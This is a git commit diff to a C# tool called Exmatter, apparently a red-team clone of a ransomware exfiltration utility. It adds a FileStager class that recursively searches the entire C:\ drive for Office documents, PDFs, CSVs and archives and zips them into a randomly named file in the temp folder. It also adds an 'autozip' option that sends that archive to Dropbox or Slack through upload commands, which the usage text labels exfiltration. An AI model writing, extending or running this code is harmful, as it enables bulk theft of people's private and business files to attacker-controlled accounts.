7162e973f076ea7345048357d59c15ff2950108e
Nick <nickswink7@gmail.com>
2023-05-02 20:06:59 -0700

    Working directory walk (autozip)

---
+++ Exmatter/FileStager.cs
@@ -0,0 +1,157 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.IO.Compression;
+using System.Linq;
+
+namespace Exmatter
+{
+    public class FileStager
+    {
+        private static readonly List<string> TargetedFileExtensions = new List<string> {
+            ".doc",
+            ".docx",
+            ".xls",
+            ".xlsx",
+            ".ppt",
+            ".pptx",
+            ".pdf",
+            //".jpg",
+            //".jpeg",
+            //".png",
+            //".bmp",
+            ".zip",
+            ".rar",
+            //".mp3",
+            //".mp4",
+            //".avi",
+            //".txt",
+            ".csv",
+            //".db",
+            //".mdb",
+            //".sql",
+            //".bak"
+        };
+
+        private readonly string _rootDirectory;
+        private readonly string _zipFilePath;
+
+        public FileStager(string rootDirectory, string zipFilePath)
+        {
+            _rootDirectory = rootDirectory;
+            _zipFilePath = zipFilePath;
+        }
+
+        public string Go()
+        {
+            var filesToZip = new List<string>();
+
+            // Recursively search for files with targeted extensions
+            SearchForFiles(_rootDirectory, filesToZip);
+
+            // Randomize the order of the files before creating the ZIP file
+            var random = new Random();
+            for (int i = filesToZip.Count - 1; i > 0; i--)
+            {
+                int j = random.Next(i + 1);
+                string temp = filesToZip[i];
+                filesToZip[i] = filesToZip[j];
+                filesToZip[j] = temp;
+            }
+
+            // Create a ZIP file containing all of the files
+            CreateZipFile(filesToZip);
+
+            return _zipFilePath;
+            
+        }
+
+        private void SearchForFiles(string directory, List<string> filesToZip)
+        {
+            try
+            {
+                if (directory.Equals("C:\\Windows", StringComparison.OrdinalIgnoreCase))
+                {
+                    // Skip searching the C:\Windows directory
+                    return;
+                }
+
+                foreach (string file in Directory.GetFiles(directory))
+                {
+                    if (TargetedFileExtensions.Contains(Path.GetExtension(file)))
+                    {
+                        filesToZip.Add(file);
+                        //Console.WriteLine($"[+] Adding file \"{file}\"");
+                    }
+                }
+
+                foreach (string subDirectory in Directory.GetDirectories(directory))
+                {
+                    SearchForFiles(subDirectory, filesToZip);
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[!] Error searching directory {directory}: {ex.Message}");
+            }
+        }
+        private string GetRandomString()
+        {
+            // Write random named zip to Local\Temp\
+            string tempFolderPath = Path.GetTempPath();
+            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            var random = new Random();
+            string randomString = new string(Enumerable.Repeat(chars, 8)
+              .Select(s => s[random.Next(s.Length)]).ToArray());
+            string outputFilePath = Path.Combine(tempFolderPath, $"{randomString}.zip");
+            
+            return outputFilePath;
+        }
+
+        private void CreateZipFile(List<string> filesToZip)
+        {
+            try
+            {
+                using (var zipArchive = ZipFile.Open(_zipFilePath, ZipArchiveMode.Create))
+                {
+                    foreach (string file in filesToZip)
+                    {
+                        // Check if the program has permissions to access the file
+                        if (HasFileAccess(file))
+                        {
+                            zipArchive.CreateEntryFromFile(file, Path.GetFileName(file));
+                            Console.WriteLine($"[+] Adding file \"{file}\" to ZIP file");
+                        }
+                        else
+                        {
+                            Console.WriteLine($"[!] Program does not have permissions to access file \"{file}\"");
+                        }
+                    }
+                }
+
+                Console.WriteLine($"[+] ZIP file created: {_zipFilePath}");
+
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[!] Error creating ZIP file: {ex.Message}");
+            }
+        }
+
+
+        private bool HasFileAccess(string filePath)
+        {
+            try
+            {
+                using (var stream = File.OpenRead(filePath))
+                {
+                    return true;
+                }
+            }
+            catch
+            {
+                return false;
+            }
+        }
+    }
+}
--- Exmatter/Program.cs
+++ Exmatter/Program.cs
@@ -1,5 +1,7 @@
 ﻿using System;
 using System.IO;
+using System.IO.Compression;
+using System.Linq;
 using System.Net;
 using System.Net.Http;
 using System.Net.Http.Headers;
@@ -11,9 +13,9 @@ namespace Exmatter
     {
         static async Task HandleDropboxCommand(string[] args)
         {
-            if (args.Length < 2)
+            if (args.Length < 3)
             {
-                Console.WriteLine("Usage: Exmatter.exe dropbox <file-path> <access-token>");
+                Console.WriteLine("Usage: Exmatter.exe dropbox <file-path>|autozip <access-token>");
                 Console.WriteLine("Description: uploads to dropbox using access-token");
                 Environment.Exit(1);
             }
@@ -29,9 +31,9 @@ namespace Exmatter
         }
         static async Task HandleSlackCommand(string[] args)
         {
-            if (args.Length < 2)
+            if (args.Length < 4)
             {
-                Console.WriteLine("Usage: Exmatter.exe slack <file-path> <API key> <slack channel name>");
+                Console.WriteLine("Usage: Exmatter.exe slack <file-path>|autozip <API key> <slack channel name>");
                 Console.WriteLine("Description: uploads to slack channel");
                 Environment.Exit(1);
             }
@@ -47,18 +49,62 @@ namespace Exmatter
 
         }
 
+        static public string HandleFileStager(string[] args)
+        {
+            // Help stuff
+            if (args.Length < 3 && args[0].ToLower().Equals("slack"))
+            {
+                Console.WriteLine("Usage: Exmatter.exe slack <file-path>|autozip <API key> <slack channel name>");
+                Console.WriteLine("Description: uploads to slack channel");
+                Environment.Exit(1);
+            }
+            if (args.Length < 3 && args[0].ToLower().Equals("dropbox"))
+            {
+                Console.WriteLine("Usage: Exmatter.exe dropbox <file-path>|autozip <access-token>");
+                Console.WriteLine("Description: uploads to dropbox using access-token");
+                Environment.Exit(1);
+            }
+
+            // Write random named zip to Local\Temp\
+            string tempFolderPath = Path.GetTempPath();
+            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            var random = new Random();
+            string randomString = new string(Enumerable.Repeat(chars, 8)
+              .Select(s => s[random.Next(s.Length)]).ToArray());
+            string outputFilePath = Path.Combine(tempFolderPath, $"{randomString}.zip");
+            
+            var fileStager = new FileStager(@"C:\", outputFilePath);
+            // Walks directory & makes zip
+            string zipFilePath = fileStager.Go();
+
+            return zipFilePath;
+        }
+
 
 
         static async Task Main(string[] args)
         {
             if (args.Length < 1)
             {
-                Console.WriteLine("Usage: Exmatter.exe dropbox|slack <file-path> <access-token>");
-                Console.WriteLine("Description: Take a guess.");
+                Console.WriteLine("Usage: Exmatter.exe dropbox|slack <file-path>|autozip [arguments]");
+                Console.WriteLine("Description: Take a guess.\n");
+                Console.WriteLine("\t <file-path>   Path to single file for exfiltration.");
+                Console.WriteLine("\t autozip       Will create and exfiltrate a zip of desired file types. (Be careful!)");
                 Environment.Exit(1);
             }
 
+            // dropbox | slack
             var subCommand = args[0].ToLower();
+
+            // filePath | autozip
+            if (args.Length >= 2 && args[1].ToLower().Equals("autozip"))
+            {
+                Console.WriteLine("do autozip");
+                string zipFilePath = HandleFileStager(args);
+                args[1] = zipFilePath; 
+            }
+
+            
 
             switch (subCommand)
             {
